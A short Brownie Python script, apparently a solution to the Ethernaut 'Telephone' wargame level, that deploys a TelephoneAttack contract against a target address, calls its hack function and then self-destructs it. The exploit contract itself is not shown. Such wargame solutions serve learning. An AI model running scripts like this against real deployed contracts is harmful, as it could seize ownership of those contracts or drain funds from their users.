from brownie import accounts, config, TelephoneAttack

def main(target):
    print(f'Target contract: {target}')
    hacker = accounts.add(config['wallets']['from_key'])
    attack = TelephoneAttack.deploy(target, {'from': hacker})
    attack.hack({'from': hacker, 'allow_revert': True})
    print("Attack done => destroy contract")
    attack.destroy({'from': hacker})
